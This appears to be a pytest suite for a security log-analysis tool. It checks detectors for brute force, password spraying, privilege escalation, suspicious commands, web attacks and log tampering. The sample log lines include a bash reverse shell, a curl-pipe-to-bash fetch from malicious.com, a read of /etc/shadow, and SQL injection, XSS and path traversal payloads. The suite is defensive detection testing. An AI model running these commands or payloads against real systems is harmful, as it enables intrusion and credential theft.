from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path
import pytest

from core.schemas import Event, SeverityEnum, VerdictEnum
from shugo_agents.log_analysis.detectors.brute_force import BruteForceDetector
from shugo_agents.log_analysis.detectors.password_spray import PasswordSprayDetector
from shugo_agents.log_analysis.detectors.impossible_login import ImpossibleLoginDetector
from shugo_agents.log_analysis.detectors.unusual_hours import UnusualHoursDetector
from shugo_agents.log_analysis.detectors.privilege_escalation import PrivilegeEscalationDetector
from shugo_agents.log_analysis.detectors.suspicious_commands import SuspiciousCommandsDetector
from shugo_agents.log_analysis.detectors.web_attacks import WebAttacksDetector
from shugo_agents.log_analysis.detectors.log_tampering import LogTamperingDetector
from shugo_agents.log_analysis.detectors.rare_event import RareEventDetector
from shugo_agents.log_analysis.ingest.parsers import (
    parse_auth_syslog_line,
    parse_web_log_line,
    parse_windows_event_json,
)

SAMPLES_DIR = Path(__file__).parent / "samples"


def test_brute_force_detector():
    detector = BruteForceDetector({
        "enabled": True,
        "failure_threshold": 3,
        "window_seconds": 300,
        "escalate_on_success": True,
    })

    # Real auth.log format lines
    lines = [
        "Nov 18 10:00:01 web01 sshd[101]: Failed password for root from 198.51.100.22 port 45123 ssh2",
        "Nov 18 10:00:05 web01 sshd[102]: Failed password for root from 198.51.100.22 port 45124 ssh2",
        "Nov 18 10:00:10 web01 sshd[103]: Failed password for root from 198.51.100.22 port 45125 ssh2",
    ]
    events = [parse_auth_syslog_line(l) for l in lines]
    events = [e for e in events if e]

    findings = detector.analyze(events)
    assert len(findings) == 1
    assert findings[0].verdict == VerdictEnum.SUSPICIOUS
    assert "198.51.100.22" in findings[0].entities.ips

    # Now add success from the same IP -> escalate to CRITICAL
    success_line = "Nov 18 10:00:15 web01 sshd[104]: Accepted password for root from 198.51.100.22 port 45126 ssh2"
    ev_success = parse_auth_syslog_line(success_line)
    assert ev_success is not None
    events.append(ev_success)

    escalated = detector.analyze(events)
    assert len(escalated) == 1
    assert escalated[0].severity == SeverityEnum.CRITICAL
    assert escalated[0].verdict == VerdictEnum.MALICIOUS


def test_password_spray_detector():
    detector = PasswordSprayDetector({
        "enabled": True,
        "distinct_user_threshold": 3,
        "window_seconds": 600,
    })

    lines = [
        "Nov 18 10:00:01 authserver sshd[201]: Failed password for alice from 203.0.113.50 port 50001 ssh2",
        "Nov 18 10:00:05 authserver sshd[202]: Failed password for bob from 203.0.113.50 port 50002 ssh2",
        "Nov 18 10:00:10 authserver sshd[203]: Failed password for charlie from 203.0.113.50 port 50003 ssh2",
    ]
    events = [parse_auth_syslog_line(l) for l in lines]
    events = [e for e in events if e]

    findings = detector.analyze(events)
    assert len(findings) == 1
    assert findings[0].mitre_technique == "T1110.003"
    assert "203.0.113.50" in findings[0].entities.ips
    assert len(findings[0].entities.users) >= 3


def test_impossible_login_detector_skips_without_geolite():
    # When geolite_city_db_path is not set, detector should skip cleanly
    detector = ImpossibleLoginDetector({"enabled": True, "geolite_city_db_path": None})
    assert detector.enabled is False
    events = []
    findings = detector.analyze(events)
    assert findings == []


def test_unusual_hours_detector():
    detector = UnusualHoursDetector({"enabled": True})

    class MockMatureBaseline:
        def is_user_baseline_mature(self, user: str) -> bool:
            return user == "devuser"

        def get_user_active_hours(self, user: str) -> set[int]:
            return {9, 10, 11, 12, 13, 14, 15, 16, 17}  # 9 AM - 5 PM UTC

    # Login at 03:00 UTC (outside 9-17)
    ev_line = "Nov 18 03:15:00 web01 sshd[301]: Accepted password for devuser from 192.168.1.15 port 51234 ssh2"
    ev = parse_auth_syslog_line(ev_line)
    assert ev is not None

    findings = detector.analyze([ev], baseline=MockMatureBaseline())
    assert len(findings) == 1
    assert findings[0].mitre_technique == "T1078"
    assert "devuser" in findings[0].entities.users


def test_privilege_escalation_detector():
    detector = PrivilegeEscalationDetector({"enabled": True})

    # 1. New user with UID 0
    uid0_line = "Nov 18 11:00:00 server01 useradd[501]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash"
    ev1 = parse_auth_syslog_line(uid0_line)
    assert ev1 is not None

    findings1 = detector.analyze([ev1])
    assert len(findings1) == 1
    assert findings1[0].severity == SeverityEnum.CRITICAL
    assert findings1[0].verdict == VerdictEnum.MALICIOUS
    assert findings1[0].mitre_technique == "T1136.001"

    # 2. User added to sudo group
    group_line = "Nov 18 11:05:00 server01 usermod[502]: add 'attacker' to group 'sudo'"
    ev2 = parse_auth_syslog_line(group_line)
    assert ev2 is not None
    findings2 = detector.analyze([ev2])
    assert len(findings2) == 1
    assert findings2[0].severity == SeverityEnum.HIGH
    assert findings2[0].mitre_technique == "T1098"


def test_suspicious_commands_detector():
    detector = SuspiciousCommandsDetector({"enabled": True})

    lines = [
        "Nov 18 12:00:00 srv01 sudo: attacker : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "Nov 18 12:01:00 srv01 sudo: attacker : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s http://malicious.com/rev.sh | bash",
        "Nov 18 12:02:00 srv01 sudo: attacker : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=cat /etc/shadow",
    ]
    events = [parse_auth_syslog_line(l) for l in lines]
    events = [e for e in events if e]

    findings = detector.analyze(events)
    assert len(findings) == 3
    rules = [f.rule for f in findings]
    assert any("T1059.004" in r for r in rules)
    assert any("T1003.008" in r for r in rules)


def test_web_attacks_detector():
    detector = WebAttacksDetector({
        "enabled": True,
        "error_burst_threshold": 3,
        "error_burst_window_seconds": 60,
    })

    # Real Nginx CLF lines
    sqli_line = '198.51.100.77 - - [18/Nov/2026:14:00:00 +0000] "GET /search.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 4500 "-" "Mozilla/5.0"'
    xss_line = '198.51.100.77 - - [18/Nov/2026:14:00:05 +0000] "GET /index.php?name=<script>alert(1)</script> HTTP/1.1" 200 1200 "-" "Mozilla/5.0"'
    traversal_line = '198.51.100.77 - - [18/Nov/2026:14:00:10 +0000] "GET /view?page=../../../../etc/passwd HTTP/1.1" 200 1200 "-" "Mozilla/5.0"'
    scanner_line = '198.51.100.77 - - [18/Nov/2026:14:00:15 +0000] "GET /login HTTP/1.1" 200 500 "-" "sqlmap/1.5#stable"'

    events = [
        parse_web_log_line(sqli_line),
        parse_web_log_line(xss_line),
        parse_web_log_line(traversal_line),
        parse_web_log_line(scanner_line),
    ]
    events = [e for e in events if e]

    findings = detector.analyze(events)
    assert len(findings) == 4
    rules = [f.rule for f in findings]
    assert any("sql_injection_attempt" in r for r in rules)
    assert any("cross_site_scripting_attempt" in r for r in rules)
    assert any("path_traversal_lfi_attempt" in r for r in rules)
    assert any("vulnerability_scanner_user_agent" in r for r in rules)


def test_log_tampering_detector():
    detector = LogTamperingDetector({"enabled": True, "max_silent_gap_minutes": 30.0})

    # Stopped syslog service
    stop_line = "Nov 18 15:00:00 host01 systemd[1]: Stopped System Logging Service."
    ev_stop = parse_auth_syslog_line(stop_line)
    assert ev_stop is not None

    findings = detector.analyze([ev_stop])
    assert len(findings) == 1
    assert findings[0].mitre_technique == "T1562.001"
    assert "logging_service_disabled" in findings[0].rule


def test_rare_event_detector():
    detector = RareEventDetector({
        "enabled": True,
        "z_score_threshold": 3.0,
        "mad_threshold": 3.0,
    })

    class MockMatureHostBaseline:
        def is_host_baseline_mature(self, host: str) -> bool:
            return host == "prod-app01"

        def is_user_baseline_mature(self, user: str) -> bool:
            return False

        def get_host_event_rate_stats(self, host: str) -> dict:
            return {"mean": 10.0, "std": 2.0, "median": 10.0, "mad": 1.5}

    now = datetime.now(timezone.utc)
    # Generate 50 events in current batch for prod-app01 (normal is 10, std is 2 -> z-score = 20)
    events = [
        Event(
            source="syslog",
            host="prod-app01",
            timestamp=now,
            event_type="syslog_event",
            raw="cron job ran",
            normalized={},
        )
        for _ in range(50)
    ]

    findings = detector.analyze(events, baseline=MockMatureHostBaseline())
    assert len(findings) == 1
    assert "T1499" in findings[0].rule
    assert findings[0].severity == SeverityEnum.MEDIUM
